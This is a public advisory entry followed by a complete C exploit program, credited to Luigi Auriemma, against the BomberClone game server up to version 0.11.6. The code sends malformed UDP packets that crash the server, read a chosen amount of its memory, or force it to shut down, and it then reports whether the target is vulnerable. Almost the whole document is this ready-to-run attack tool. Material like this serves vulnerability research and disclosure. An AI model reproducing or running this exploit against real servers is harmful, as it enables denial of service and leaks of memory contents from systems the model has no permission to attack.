source: http://www.securityfocus.com/bid/19255/info

Bomberclone is prone to remote information-disclosure and denial-of-service vulnerabilities because it fails to properly sanitize user-supplied input.

These issues allow remote attackers to access sensitive information and to crash the application, denying further service to legitimate users.

Version 0.11.6 is reported vulnerable; other versions may also be affected.

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "show_dump.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER             "0.1"
#define PORT            11000
#define BUFFSZ          0xffff

#define LEN_VERSION     20
#define LEN_GAMENAME    32



void show_bomberclone_info(u_char *p);

int put08(u_char *data, int num);
int get08(u_char *data, int *num);
int put16(u_char *data, int num);
int get16(u_char *data, int *num);
int put32(u_char *data, int num);
int get32(u_char *data, int *num);
#define putsx(data, src, len)   len; strncpy(data - len, src, len);

void delimit(u_char *data);
int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int timeout(int sock, int secs);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;

enum _network_data {
    PKG_error = 0,
    PKG_gameinfo,
    PKG_joingame,   // every packet below here will checked 
                    // if it comes from a orginal player
    PKG_contest,    
    PKG_playerid,   
    PKG_servermode,
    PKG_pingreq,
    PKG_pingack,
    PKG_getfield,
    PKG_getplayerdata,
    PKG_teamdata,
    PKG_fieldline,
    PKG_pkgack,
    PKG_mapinfo,
    PKG_tunneldata,
    PKG_updateinfo, 
    PKG_field,          // forward - always be the first field
    PKG_playerdata,     // forward
    PKG_bombdata,       // forward
    PKG_playerstatus,   // forward
    PKG_playermove,     // forward
    PKG_chat,           // forward
    PKG_ill,            // forward
    PKG_special,        // forward
    PKG_dropitem,       // forward
    PKG_respawn,        // forward
    PKG_quit            // forward - always the last known type forwarded type
};

enum _pkgflags {
    PKGF_ackreq = 1,
    PKGF_ipv6 = 2
};



int main(int argc, char *argv[]) {
    int     sd,
            attack,
            len,
            pcksz;
    u_short port  = PORT;
    u_char  *buff,
            *p,
            *t;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "BomberClone <= 0.11.6 bugs "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attacks:\n"
            " 1 = memcpy crash in rscache_add\n"
            " 2 = information disclosure in send_pkg\n"
            " 3 = simple error message termination\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    p = buff;
    p += put08(p, PKG_gameinfo);        // typ
    p += put08(p, 0);                   // flags
    p += put16(p, 0);                   // id
    t = p;  p += 2;                     // len

    p += put32(p, 0);                   // timestamp
    p += put16(p, 0);                   // ??? unknown
    p += put08(p, 0);                   // curplayers
    p += put08(p, 0);                   // maxplayers
    p += putsx(p, "", LEN_GAMENAME);    // gamename
    p += putsx(p, "", LEN_VERSION);     // version
    p += put08(p, 0);                   // broadcast
    p += put08(p, -1);                  // password

    put16(t, (p - t) - 2);

    len = send_recv(sd, buff, p - buff, buff, BUFFSZ, 1);

    close(sd);

    show_bomberclone_info(buff);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    if(attack == 1) {
        p = buff;
        p += put08(p, PKG_gameinfo);
        p += put08(p, PKGF_ackreq);     // required!

        p += put16(p, 0);
        p += put16(p, 0xffff);          // bug

        p += put32(p, 0);
        p += put16(p, 0);
        p += put08(p, 0);
        p += put08(p, 0);
        p += putsx(p, "", LEN_GAMENAME);
        p += putsx(p, "", LEN_VERSION);
        p += put08(p, 0);
        p += put08(p, -1);

        printf("- send malformed packet\n");
        len = send_recv(sd, buff, p - buff, buff, BUFFSZ, 0);

    } else if(attack == 2) {
        printf(
            "- insert the amount of bytes you want to read from the server's memory,\n"
            "  try with 3000 or 3500:\n"
            "  ");
        fflush(stdin);
        fgets(buff, BUFFSZ, stdin);
        pcksz = atoi(buff);

        p = buff;
        p += put08(p, PKG_gameinfo);
        p += put08(p, 0);

        p += put16(p, 0);
        p += put16(p, pcksz);           // how many memory you want to see?

        p += put32(p, 0);
        p += put16(p, 0);
        p += put08(p, 0);
        p += put08(p, 0);
        p += putsx(p, "", LEN_GAMENAME);
        p += putsx(p, "", LEN_VERSION);
        p += put08(p, 0);
        p += put08(p, -1);

        printf("- send custom info packet (%d 0x%x bytes)\n", pcksz, pcksz);
        do {
            len = send_recv(sd, buff, p - buff, buff, BUFFSZ, 0);
        } while((len > 0) && (buff[0] != PKG_gameinfo));
        if(len > 0) show_dump(buff, len, stdout);
        goto quit;

    } else {
        p = buff;
        p += put08(p, PKG_error);
        p += put08(p, 0);
        p += put16(p, 0);
        t = p;  p += 2;

        p += put08(p, 1);               // nr
        p += putsx(p, "bye bye", 128);  // text

        put16(t, (p - t) - 2);

        printf("- send error packet\n");
        len = send_recv(sd, buff, p - buff, buff, BUFFSZ, 0);
    }

    close(sd);

    sleep(ONESEC);

    printf("- check server:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    p = buff;
    p += put08(p, PKG_gameinfo);
    p += put08(p, 0);
    p += put16(p, 0);
    t = p;  p += 2;

    p += put32(p, 0);
    p += put16(p, 0);
    p += put08(p, 0);
    p += put08(p, 0);
    p += putsx(p, "", LEN_GAMENAME);
    p += putsx(p, "", LEN_VERSION);
    p += put08(p, 0);
    p += put08(p, -1);

    put16(t, (p - t) - 2);

    len = send_recv(sd, buff, p - buff, buff, BUFFSZ, 0);
    if(len < 0) {
        printf("\n  Server IS vulnerable!!!\n\n");
    } else {
        printf("\n  Server doesn't seem vulnerable\n\n");
    }

quit:
    close(sd);
    return(0);
}



void show_bomberclone_info(u_char *p) {
    int     curplayers,
            maxplayers;
    u_char  *gamename,
            *version;

    p += 12;
    p += get08(p, &curplayers);
    p += get08(p, &maxplayers);
    gamename = p;
    version  = p + LEN_GAMENAME;

    printf("\n"
        "  server:    %.*s\n"
        "  version:   %.*s\n"
        "  players:   %d/%d\n"
        "\n",
        LEN_GAMENAME,   gamename,
        LEN_VERSION,    version,
        curplayers,     maxplayers);
}



int put08(u_char *data, int num) {
    data[0] = num;
    return(1);
}



int get08(u_char *data, int *num) {
    if(num) {
        *num = data[0];
    }
    return(1);
}



int put16(u_char *data, int num) {
    data[0] = num;
    data[1] = num >> 8;
    return(2);
}



int get16(u_char *data, int *num) {
    if(num) {
        *num = data[0] | (data[1] << 8);
    }
    return(2);
}



int put32(u_char *data, int num) {
    data[0] = num;
    data[1] = num >> 8;
    data[2] = num >> 16;
    data[3] = num >> 24;
    return(4);
}



int get32(u_char *data, int *num) {
    if(num) {
        *num = data[0] | (data[1] << 8) | (data[2] << 16) | (data[3] << 24);
    }
    return(4);
}



void delimit(u_char *data) {
    while(*data && (*data != '\n') && (*data != '\r')) data++;
    *data = 0;
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     retry,
            len;

    if(in && !out) {
        if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        return(0);

    } else if(in) {
        for(retry = 3; retry; retry--) {
            if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            goto timeout_received;
        }

    } else {
        if(timeout(sd, 3) < 0) {
            goto timeout_received;
        }
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    return(len);

timeout_received:
    if(err) {
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }
    return(-1);
}



int timeout(int sock, int sec) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = sec;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif